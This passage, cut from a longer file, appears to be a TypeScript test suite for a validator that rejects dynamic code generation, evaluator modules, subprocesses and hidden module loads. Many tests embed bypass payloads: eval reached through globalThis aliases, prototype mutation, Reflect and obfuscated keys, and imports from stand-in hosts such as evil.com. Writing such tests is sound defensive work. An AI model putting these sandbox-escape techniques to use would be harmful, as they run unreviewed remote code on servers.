        Error,
        "dynamic code generation",
        "self references the global object, so a computed read off it must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const g = globalThis.self; const name = ["e", "v", "a", "l"].join("");` +
              ` const run = g[name]; run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a global-object property that returns the global object must remain a global alias",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `let g; g ||= globalThis; const name = ["e", "v", "a", "l"].join("");` +
              ` g[name]('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "logical assignment must retain the capability carried by its right-hand side",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const g = globalThis.valueOf(); const name = ["e", "v", "a", "l"].join("");` +
              ` g[name]('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "global valueOf returns the same capability-bearing object",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const g = globalThis?.valueOf();` +
              ` new g.Worker("https://blocked.example/worker.js", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "optional valueOf returns the same capability-bearing global object",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const R = Reflect; const name = ["e", "v", "a", "l"].join("");` +
              ` const run = R.get(globalThis, name); run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "aliasing Reflect must not hide an undecidable read from the global object",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const read = (object: Record<string, unknown>, key: string) => object[key];` +
              ` const g = globalThis; const run = read(g, "eval");`,
            [],
          ),
        Error,
        "dynamic code generation",
        "passing a global-object alias to code this local analysis cannot follow must fail closed",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { get } = Reflect; const name = ["e", "v", "a", "l"].join("");` +
              ` const run = get(globalThis, name); run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a destructured reflective getter must not make a computed global read safe",
      );
    });

    it("should allow a typed global alias used only for a static cache slot", async () => {
      await validateHTTPImports(
        `const g = globalThis as typeof globalThis & { cache?: object };` +
          ` export const cache = g.cache ??= {};`,
        [],
      );
    });

    it("should allow a computed metadata write without treating the key as a read", async () => {
      await validateHTTPImports(
        `const metadata = Symbol.for("veryfront.openapi.metadata");` +
          ` const handler = () => new Response("ok");` +
          ` (handler as unknown as Record<symbol, unknown>)[metadata] = {};`,
        [],
      );
    });

    it("should allow computed member writes nested in destructuring assignments", async () => {
      await validateHTTPImports(
        `const handler = () => new Response("ok"); const metadata = getMetadata();` +
          ` ({ value: handler[metadata] } = getResult());` +
          ` export const GET = handler;`,
        [],
      );
    });

    it("should ignore inert generator names and locally bound identifiers", async () => {
      const cases = [
        `type Handler = Function; export const GET: Handler = () => new Response("ok");`,
        `const Function = () => "local"; export const GET = () => new Response(Function());`,
        `export const label = "Function"; export const GET = () => new Response(label);`,
        `// eval and Function are mentioned only in documentation\nexport const GET = () => new Response("ok");`,
        `const metadata = { constructor: "ordinary" };` +
        ` export const GET = () => new Response(metadata.constructor);`,
        `const note = "const g = globalThis"; const g = { safe: "ok" };` +
        ` const name = "safe"; export const GET = () => new Response(g[name]);`,
      ];

      for (const source of cases) {
        await validateHTTPImports(source, []);
      }
    });

    it("should allow safe local object destructuring of generator-like keys", async () => {
      await validateHTTPImports(
        `const source = { constructor: "ordinary", eval: "text", Function: "name" };` +
          ` const { constructor: ctor, eval: run, Function: make } = source;` +
          ` export const GET = () => new Response(String(ctor + run + make));`,
        [],
      );
      await validateHTTPImports(
        `const source = { constructor: "ordinary" }; const key = "constructor";` +
          ` const { [key]: value } = source;` +
          ` export const GET = () => new Response(String(value));`,
        [],
      );
    });

    it("should reject dangerous destructuring from the global object", async () => {
      for (
        const source of [
          `const { eval: run } = globalThis; run(payload);`,
          `const { Function: Make } = globalThis.valueOf(); Make(payload)();`,
          `let Make; ({ constructor: Make } = globalThis?.valueOf()); Make(payload)();`,
          `const key = ["e", "v", "a", "l"].join(""); let run; ({ [key]: run } = globalThis); run(payload);`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "global-object destructuring can expose eval, Function, constructor, or an unknown computed key",
        );
      }
    });

    it("should reject constructor reads from object literals with a custom prototype", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = { __proto__: () => {} }; const make = holder.constructor;` +
              ` make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an object literal prototype setter can replace constructor with executable code",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = {}; Object.setPrototypeOf(holder, () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a later prototype mutation invalidates the plain-object constructor exemption",
      );
      for (
        const mutation of [
          `Object.setPrototypeOf.call(null, holder, () => {});`,
          `Reflect.setPrototypeOf.apply(null, [holder, () => {}]);`,
          `Reflect.apply(Object.setPrototypeOf, null, [holder, () => {}]);`,
          `const setProto = Reflect.setPrototypeOf;` +
          ` let args = [{}, null]; args = [holder, () => {}]; setProto.apply(null, args);`,
          `Object.setPrototypeOf.bind(Object, holder, () => {})();`,
          `Reflect.setPrototypeOf.bind(Reflect, holder, () => {})();`,
          `const setProto = Object.setPrototypeOf.bind(Object, holder, () => {}); setProto();`,
          `const setProto = Reflect.setPrototypeOf.bind(Reflect, holder, () => {}); setProto();`,
          `Object.setPrototypeOf.bind.call(Object.setPrototypeOf, Object, holder, () => {})();`,
          `Reflect.setPrototypeOf.bind.call(Reflect.setPrototypeOf, Reflect, holder, () => {})();`,
          `Object.setPrototypeOf.bind.apply(Object.setPrototypeOf, [Object, holder, () => {}])();`,
          `Reflect.setPrototypeOf.bind.apply(Reflect.setPrototypeOf, [Reflect, holder, () => {}])();`,
          `const bind = Object.setPrototypeOf.bind;` +
          ` bind.call(Object.setPrototypeOf, Object, holder, () => {})();`,
          `const bind = Reflect.setPrototypeOf.bind;` +
          ` bind.apply(Reflect.setPrototypeOf, [Reflect, holder, () => {}])();`,
          `Function.prototype.bind.call(Object.setPrototypeOf, Object, holder, () => {})();`,
          `Function.prototype.bind.apply(Reflect.setPrototypeOf, [Reflect, holder, () => {}])();`,
          `Reflect.apply(Function.prototype.bind, Object.setPrototypeOf,` +
          ` [Object, holder, () => {}])();`,
          `const setProto = Object.setPrototypeOf.bind.call(Object.setPrototypeOf, Object);` +
          ` setProto(holder, () => {});`,
          `const setProto = Reflect.setPrototypeOf.bind.apply(Reflect.setPrototypeOf, [Reflect]);` +
          ` setProto(holder, () => {});`,
          `const bind = Object.setPrototypeOf.bind;` +
          ` const setProto = bind.call(Object.setPrototypeOf, Object);` +
          ` setProto(holder, () => {});`,
          `const setProto = Function.prototype.bind.call(Object.setPrototypeOf, Object);` +
          ` setProto(holder, () => {});`,
          `const setProto = Reflect.apply(Function.prototype.bind,` +
          ` Reflect.setPrototypeOf, [Reflect]); setProto(holder, () => {});`,
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `const holder = {}; ${mutation}` +
                ` const make = holder.constructor;` +
                ` make('return import("https://blocked.example/mod.js")')();`,
              [],
            ),
          Error,
          "dynamic code generation",
          "calling a borrowed setPrototypeOf mutator must invalidate the target object",
        );
      }
      await validateHTTPImports(
        `const first = {}; Object.setPrototypeOf(first, null);` +
          ` const mutate = Reflect.setPrototypeOf; const second = {};` +
          ` mutate(second, null);` +
          ` const third = {};` +
          ` (Object.setPrototypeOf as typeof Object.setPrototypeOf)(third, null);` +
          ` const fourth = {}; Object.setPrototypeOf!(fourth, null);`,
        [],
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const mutate = Object.setPrototypeOf; const holder = {};` +
              ` mutate(holder, () => {}); const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a direct call through a prototype-mutator alias must invalidate its target",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { setPrototypeOf: mutate } = Object; const holder = {};` +
              ` mutate(holder, () => {}); const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a destructured prototype-mutator alias must invalidate its target",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = {}; Reflect.set(holder, "__proto__", () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "Reflect.set can invoke the inherited prototype setter too",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = {}; Reflect.set({}, "__proto__", () => {}, holder);` +
              ` const make = holder.constructor;` +
              ` make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "Reflect.set applies the inherited prototype setter to its explicit receiver",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const source = Object.defineProperty({}, "__proto__", {` +
              ` value: () => {}, enumerable: true });` +
              ` const holder = {}; Object.assign(holder, source);` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "Object.assign can copy an own __proto__ property through the inherited setter",
      );
      for (
        const source of [
          `const source = { __proto__() {} };`,
          `const source = { ["__proto__"]() {} };`,
          `const key = ["__", "proto__"].join(""); const source = { [key]() {} };`,
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `${source} const holder = {}; Object.assign(holder, source);` +
                ` const make = holder.constructor;` +
                ` make("return 1")();`,
              [],
            ),
          Error,
          "dynamic code generation",
          "Object.assign can copy an enumerable __proto__ method through the inherited setter",
        );
      }
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const source = Object.fromEntries([["__proto__", () => {}]]);` +
              ` const holder = {}; Object.assign(holder, source);` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "Object.assign must distrust sources whose enumerable keys cannot be proven safe",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const assign = Object.assign;` +
              ` const source = Object.fromEntries([["__proto__", () => {}]]);` +
              ` const holder = {}; assign(holder, source);` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an Object.assign method alias can still invoke the inherited __proto__ setter",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const methods = {}; methods.copy = Object.assign;` +
              ` const source = Object.fromEntries([["__proto__", () => {}]]);` +
              ` const holder = {}; methods.copy(holder, source);` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an Object.assign alias assigned to an object property remains a prototype mutator",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = {}; const key = ["__", "proto__"].join("");` +
              ` holder[key] = () => {}; const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an unresolved assignment key may invoke the inherited __proto__ setter",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const setter = Object.getOwnPropertyDescriptor(Object.prototype, "__proto__").set;` +
              ` const holder = {}; setter.call(holder, () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an extracted Object.prototype.__proto__ setter can mutate the holder through call",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const setter = Reflect.getOwnPropertyDescriptor(Object.prototype, "__proto__").set;` +
              ` const holder = {}; Reflect.apply(setter, holder, [() => {}]);` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "Reflect.apply on an extracted __proto__ setter can mutate the holder",
      );
      await validateHTTPImports(
        `const source = { __proto__: () => {} };` +
          ` const holder = {}; Object.assign(holder, source);` +
          ` const make = holder.constructor;` +
          ` export const GET = () => new Response(String(make));`,
        [],
      );
      await validateHTTPImports(
        `const holder = { ["__proto__"]: () => {} };` +
          ` const make = holder.constructor;` +
          ` export const GET = () => new Response(String(make));`,
        [],
      );
    });

    it("should allow inert feature detection of prototype mutators", async () => {
      await validateHTTPImports(
        `const objectSupport = typeof Object.setPrototypeOf === "function";` +
          ` const reflectSupport = Reflect.setPrototypeOf !== undefined;` +
          ` const sameImplementation = Object.setPrototypeOf === Reflect.setPrototypeOf;` +
          ` export const GET = () => Response.json({` +
          ` objectSupport, reflectSupport, sameImplementation });`,
        [],
      );
      await validateHTTPImports(
        `const setProto = Object.setPrototypeOf;` +
          ` export const support = { setProto: typeof setProto === "function" };`,
        [],
      );
      await validateHTTPImports(
        `const setProto = Object.setPrototypeOf;` +
          ` const supported = !!setProto;` +
          ` const status = setProto ? "supported" : "unsupported";` +
          ` if (setProto) { exportSupport(supported); }` +
          ` function exportSupport(_supported: boolean) {}` +
          ` export { status, supported };`,
        [],
      );
      await validateHTTPImports(
        `const setProto = Object.setPrototypeOf;` +
          ` let supported = true;` +
          ` switch (setProto) { case undefined: supported = false; break; }` +
          ` export { supported };`,
        [],
      );
      await validateHTTPImports(
        `const flag = true;` +
          ` const objectSupport = typeof (Object.setPrototypeOf ?? undefined) === "function";` +
          ` const reflectSupport = (flag ? Reflect.setPrototypeOf : undefined) !== undefined;` +
          ` export const GET = () => Response.json({ objectSupport, reflectSupport });`,
        [],
      );
      await validateHTTPImports(
        `const flag = true; const safeMutate = (_target: object, _prototype: object | null) => true;` +
          ` const mutate = flag ? Object.setPrototypeOf : safeMutate;` +
          ` const holder = {}; mutate(holder, null);` +
          ` export const GET = () => new Response(String(Object.getPrototypeOf(holder)));`,
        [],
      );
      await validateHTTPImports(
        `const safeMutate = (_target: object, _prototype: object | null) => true;` +
          ` const mutate = Object.setPrototypeOf ?? safeMutate;` +
          ` const holder = {}; mutate(holder, null);` +
          ` export const GET = () => new Response(String(Object.getPrototypeOf(holder)));`,
        [],
      );
      for (
        const inspection of [
          `Object.setPrototypeOf == Reflect.setPrototypeOf`,
          `Object.setPrototypeOf < Reflect.setPrototypeOf`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(`export const result = ${inspection};`, []),
          Error,
          "dynamic code generation",
          "coercing comparisons can invoke hooks on a prototype mutator",
        );
      }
    });

    it("should allow a tracked prototype-mutator alias assigned as a statement", async () => {
      await validateHTTPImports(
        `const holder = {}; Object.setPrototypeOf.call(null, holder, null);` +
          ` export const GET = () => new Response(String(Object.getPrototypeOf(holder)));`,
        [],
      );
      await validateHTTPImports(
        `const first = {}; Reflect.setPrototypeOf.apply(null, [first, null]);` +
          ` const second = {}; Reflect.apply(Object.setPrototypeOf, null, [second, null]);` +
          ` export const GET = () => new Response(String(` +
          ` Object.getPrototypeOf(first) === Object.getPrototypeOf(second)));`,
        [],
      );
      await validateHTTPImports(
        `let mutate; mutate = Object.setPrototypeOf;` +
          ` const holder = {}; mutate(holder, null);` +
          ` export const GET = () => new Response(String(Object.getPrototypeOf(holder)));`,
        [],
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `let mutate; mutate = Object.setPrototypeOf; const holder = {};` +
              ` mutate(holder, () => {}); const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "the standalone alias assignment must remain tracked at its later call",
      );
    });

    it("should retain prototype-mutator capability through logical assignments", async () => {
      await validateHTTPImports(
        `let mutate = Object.setPrototypeOf;` +
          ` const safeMutate = (_target: object, _prototype: object | null) => true;` +
          ` const holder = {}; (mutate &&= safeMutate)(holder, null);` +
          ` const make = holder.constructor;` +
          ` export const GET = () => new Response(String(make));`,
        [],
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `let mutate = Object.setPrototypeOf; const holder = {};` +
              ` (mutate ||= (_target, _prototype) => false)(holder, () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "logical assignment can preserve an existing prototype-mutator alias",
      );
    });

    it("should reject unresolved constructor keys after prototype mutation", async () => {
      const mutations = [
        `const holder = {}; Object.setPrototypeOf(holder, () => {});`,
        `const holder = {}; Reflect.set(holder, "__proto__", () => {});`,
        `const source = Object.defineProperty({}, "__proto__", {` +
        ` value: () => {}, enumerable: true });` +
        ` const holder = {}; Object.assign(holder, source);`,
      ];

      for (const mutation of mutations) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `${mutation} const key = ["con", "structor"].join("");` +
                ` const make = holder[key];` +
                ` make('return import("https://blocked.example/mod.js")')();`,
              [],
            ),
          Error,
          "dynamic code generation",
          "an unresolved key may select constructor after the object stops being provably plain",
        );
      }
    });

    it("should reject static constructor keys in destructuring", async () => {
      for (
        const pattern of [
          `const { "constructor": Make } = () => {};`,
          `const { ["con" + "structor"]: Make } = () => {};`,
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `${pattern} Make('return import("https://evil.com/mod.js")')();`,
              [],
            ),
          Error,
          "dynamic code generation",
          "quoted and computed static keys obtain the same Function constructor",
        );
      }
    });

    it("should reject constructor keys destructured from function parameters", async () => {
      for (
        const source of [
          `(function ({ constructor: make }) {` +
          ` make('return import("https://blocked.example/mod.js")')();` +
          `})(() => {});`,
          `(function ({ constructor: make = undefined }) {` +
          ` make('return import("https://blocked.example/mod.js")')();` +
          `})(() => {});`,
          `(function ({ nested: { constructor: make } }) {` +
          ` make('return import("https://blocked.example/mod.js")')();` +
          `})({ nested: () => {} });`,
          `const key = "constructor"; (function ({ [key]: make }) {` +
          ` make('return import("https://blocked.example/mod.js")')();` +
          `})(() => {});`,
          `try { throw () => {}; } catch ({ constructor: make }) {` +
          ` make('return import("https://blocked.example/mod.js")')(); }`,
          `for (const { constructor: make } of [() => {}]) {` +
          ` make('return import("https://blocked.example/mod.js")')(); }`,
          `const { nested: { constructor: make } } = { nested: () => {} };` +
          ` make('return import("https://blocked.example/mod.js")')();`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "a parameter pattern can obtain Function through a callable argument",
        );
      }
      await validateHTTPImports(`function read({ value }) { return value; }`, []);
    });

    it("should reject descriptor aliases destructured from unknown parameters", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `function run({ getOwnPropertyDescriptor: get }) {` +
              ` const make = get(Object.getPrototypeOf(() => {}),` +
              ` "cons" + "tructor").value;` +
              ` make('return import("https://blocked.example/mod.js")')();` +
              ` } run(Object);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an unknown parameter can expose a descriptor reader",
      );
    });

    it("should allow reflective reads that cannot expose a code generator", async () => {
      await validateHTTPImports(
        `const value = Reflect.get(someObject, "value"); export const GET = () => value;`,
        [],
      );
      await validateHTTPImports(
        `const c = Reflect.get(globalThis, "crypto"); export const GET = () => c;`,
        [],
      );
      await validateHTTPImports(
        `const get = Object.getOwnPropertyDescriptor;` +
          ` const value = get({ value: 1 }, "value")?.value;` +
          ` export const GET = () => value;`,
        [],
      );
    });

    it("should reject guarded Reflect.get calls through local aliases", async () => {
      for (
        const invocation of [
          `get(() => {}, "constructor")`,
          `get?.(() => {}, "constructor")`,
          `get.call(Reflect, () => {}, "constructor")`,
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `const get = Reflect.get; const make = ${invocation};` +
                ` make('return import("https://blocked.example/mod.js")')();`,
              [],
            ),
          Error,
          "dynamic code generation",
          `${invocation} must retain Reflect.get capability checks`,
        );
      }
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { get } = Reflect; const make = get(() => {}, "constructor");` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "destructuring Reflect.get must retain the guarded intrinsic",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `let get; ({ get } = Reflect); const make = get(() => {}, "constructor");` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an assigned Reflect.get alias must retain the guarded intrinsic",
      );
    });

    it("should reject a dynamic Reflect.get key on an unproven target", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const name = ["con", "str", "uctor"].join("");` +
              ` const make = Reflect.get(() => {}, name);` +
              ` make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an unresolved reflective key may select a callable target constructor",
      );
    });

    it("should reject a computed property read this analysis cannot resolve on a callable", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const fn = () => {}; const key = ["con", "structor"].join("");` +
              ` const make = fn[key];` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an undecidable computed key on a function may spell constructor and reach Function",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `function helper() {} const key = atob("Y29uc3RydWN0b3I=");` +
              ` helper[key]('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a function declaration binding carries the same constructor property",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import helper from "./helper.ts";` +
              ` const key = ["con", "structor"].join("");` +
              ` helper[key]('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an imported value may be callable even though its initializer is in another module",
      );
      await validateHTTPImports(
        `const table = { safe: "ok" }; const key = computeKey();` +
          ` export const GET = () => new Response(String(table[key]));`,
        [],
      );
      await validateHTTPImports(
        `const items = ["safe"];` +
          ` export const GET = () => new Response(items[0]);`,
        [],
      );
      await validateHTTPImports(
        `const items = ["safe"]; const iterator = Symbol.iterator;` +
          ` const first = items[iterator]().next().value;` +
          ` export const GET = () => new Response(first);`,
        [],
      );
      for (
        const source of [
          `const Symbol = { iterator: "constructor" }; const fn = () => {};` +
          ` fn[Symbol.iterator]('return import("https://blocked.example/mod.js")')();`,
          `const SymbolAlias = chooseGlobal ? Symbol : { iterator: "constructor" };` +
          ` const fn = () => {};` +
          ` fn[SymbolAlias.iterator]('return import("https://blocked.example/mod.js")')();`,
          `let iterator = Symbol.iterator; iterator = "constructor"; const fn = () => {};` +
          ` fn[iterator]('return import("https://blocked.example/mod.js")')();`,
          `let iterator = "constructor"; const fn = () => {};` +
          ` fn[iterator ||= Symbol.iterator]('return import("https://blocked.example/mod.js")')();`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "a shadowed or reassigned Symbol alias must not exempt a computed constructor read",
        );
      }
    });

    it("should track prototype mutations through aliases of Object and Reflect", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const O = Object; const holder = {}; O.setPrototypeOf(holder, () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an alias of Object reaches the same prototype mutator",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const R = Reflect; const holder = {};` +
              ` R.set(holder, "__proto__", () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an alias of Reflect reaches the same prototype setter",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = {}; globalThis.Object.setPrototypeOf(holder, () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "Object read off the global object is the same prototype mutator",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const O = Object; const holder = {};` +
              ` O.assign(holder, { ["__proto__"]: () => {} });` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "Object.assign can copy an enumerable __proto__ property through an alias",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const O = Object; const payload = {}; const holder = {};` +
              ` O.defineProperty(payload, "__proto__", { value: () => {}, enumerable: true });` +
              ` O.assign(holder, payload);` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "Object.assign can copy an enumerable __proto__ property defined on a source object",
      );
    });

    it("should reject imports of runtime modules that evaluate source text", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import { runInThisContext } from "node:vm";` +
              ` runInThisContext('new Worker("https://blocked.example/mod.js", { type: "module" })');`,
            [],
          ),
        Error,
        "code evaluation",
        "node:vm evaluates strings this validator can never scan as code",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const vm = await import("node:vm"); export const GET = () => new Response(String(vm));`,
            [],
          ),
        Error,
        "code evaluation",
        "a dynamic import reaches the same evaluator",
      );
      for (
        const moduleName of [
          "inspector",
          "inspector/promises",
          "repl",
          "node:inspector",
          "node:inspector/promises",
          "node:repl",
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `import { Session } from "${moduleName}";` +
                ` const session = new Session();` +
                ` session.post("Runtime.evaluate", { expression: "eval(source)" });`,
              [],
            ),
          Error,
          "code evaluation",
          `${moduleName} evaluates strings in the server process`,
        );
        await assertRejects(
          async () => await validateHTTPImports(`await import("${moduleName}");`, []),
          Error,
          "code evaluation",
          `a dynamic ${moduleName} import reaches the same evaluator`,
        );
        await assertRejects(
          async () => await validateHTTPImports(`require("${moduleName}");`, []),
          Error,
          "code evaluation",
          `a CommonJS ${moduleName} load reaches the same evaluator`,
        );
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `process.getBuiltinModule("${moduleName}");`,
              [],
            ),
          Error,
          "dynamic code generation",
          `process.getBuiltinModule can recover ${moduleName}`,
        );
      }
    });

    it("should reject imports of runtime module loaders such as createRequire", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import { createRequire } from "node:module";` +
              ` const require = createRequire(import.meta.url);` +
              ` export const value = require("./helper.cjs");`,
            [],
          ),
        Error,
        "createRequire",
        "a createRequire load never appears in the module graph this validator walks",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `require.extensions[".js"] = (module, filename) =>` +
              ` module._compile(Deno.readTextFileSync(filename), filename);` +
              ` require("installed-dependency");`,
            [],
          ),
        Error,
        "dynamic code generation",
        "require.extensions can execute source outside the validated graph",
      );
      for (const moduleName of ["node:worker_threads", "worker_threads"]) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `import { Worker as Thread } from "${moduleName}";` +
                ` new Thread(new URL("./helper.ts", import.meta.url));`,
              [],
            ),
          Error,
          "Worker module loading",
          `${moduleName} starts an unchecked module graph`,
        );
      }
      for (const moduleName of ["node:child_process", "child_process"]) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `import { spawn } from "${moduleName}";` +
                ` spawn(Deno.execPath(), ["run", "-A", "https://blocked.example/mod.ts"]);`,
              [],
            ),
          Error,
          "subprocess module loading",
          `${moduleName} can launch a runtime outside the checked module graph`,
        );
      }
      for (const moduleName of ["node:cluster", "cluster"]) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `import cluster from "${moduleName}";` +
                ` cluster.setupPrimary({ exec: "./unchecked.cjs" }); cluster.fork();`,
              [],
            ),
          Error,
          "subprocess module loading",
          `${moduleName} can launch an unchecked runtime outside the module graph`,
        );
      }
      for (
        const source of [
          `import { run } from "node:test"; run({ files: ["./unchecked.cjs"] });`,
          `const tests = await import("node:test"); tests.run({ files: ["./unchecked.cjs"] });`,
          `const tests = require("node:test"); tests.run({ files: ["./unchecked.cjs"] });`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "subprocess module loading",
          "node:test can execute a test file outside the checked module graph",
        );
      }
      await assertRejects(
        async () => await validateHTTPImports(`process.getBuiltinModule("node:test");`, []),
        Error,
        "dynamic code generation",
        "getBuiltinModule must not recover the node:test runner",
      );
      await validateHTTPImports(`import testPackage from "test"; void testPackage;`, []);
    });

    it("should reject module loads hidden from the bundled graph", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const name = "./helper.cjs"; export const value = require(name);`,
            [],
          ),
        Error,
        "unconstrained dynamic import",
        "a nonliteral require target is invisible to the graph and injected require shim",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const loaders = { load: require }; export const value = loaders.load("./unchecked.cjs");`,
            [],
          ),
        Error,
        "unconstrained dynamic import",
        "a require alias stored on an object is invisible to the bundled graph",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const loaders = {}; loaders.load = require;` +
              ` export const value = loaders.load("./unchecked.cjs");`,
            [],
          ),
        Error,
        "unconstrained dynamic import",
        "a require alias assigned to an object property is invisible to the bundled graph",
      );
      for (
        const source of [
          `const source = { load: require }; const loaders = { ...source };` +
          ` export const value = loaders.load("./unchecked.cjs");`,
          `const loaders = Object.assign({}, { load: require });` +
          ` export const value = loaders.load("./unchecked.cjs");`,
          `const loaders = {}; Object.assign(loaders, { load: require });` +
          ` export const value = loaders.load("./unchecked.cjs");`,
          `const loaders = {}; Object.defineProperty(loaders, "load", { value: require });` +
          ` export const value = loaders.load("./unchecked.cjs");`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "unconstrained dynamic import",
          "copying a require alias onto an object must not hide it from the bundled graph",
        );
      }
      for (
        const source of [
